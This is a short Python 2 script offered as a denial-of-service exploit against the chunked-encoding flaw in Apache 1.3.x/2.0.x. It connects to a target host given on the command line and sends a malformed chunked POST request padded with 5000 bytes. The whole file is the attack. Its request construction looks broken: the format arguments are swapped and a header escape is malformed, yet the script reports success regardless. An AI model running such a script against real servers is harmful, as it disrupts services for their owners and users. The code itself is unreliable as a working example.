#!/usr/bin/env python
##
#       Apache 1.3.x/2.0.x 
#        chunked encoding 
#           DoS sploit
# 
#     check ur googling skillz
#              see 
#  security_bulletin_20020620.txt
#          for detailz   
#
#  by d4 m4d 0hd4y 0wn3rz [ m00 ]
#            l.0.l
##

import sys,socket,time

if len(sys.argv)!=2:
  print 'Usage: ./%s <hostname>' % sys.argv[0]
  sys.exit(1)

mass = 'A'*5000

req ='''
POST /index.html HTTP/1.1\r\nAccept: */*\r\nHost: %s\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\
Transfer-Encoding: chunked\r\n\Content-Length: 5000 %s\n
''' % (mass,sys.argv[1])

h=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
  h.connect((sys.argv[1],80))
  h.send(req)
  print '[*] Exploit sent successfuly'
  h.close()
  time.sleep(1)
  sys.exit(0)

except socket.error,seex:
 print seex
 sys.exit(1)
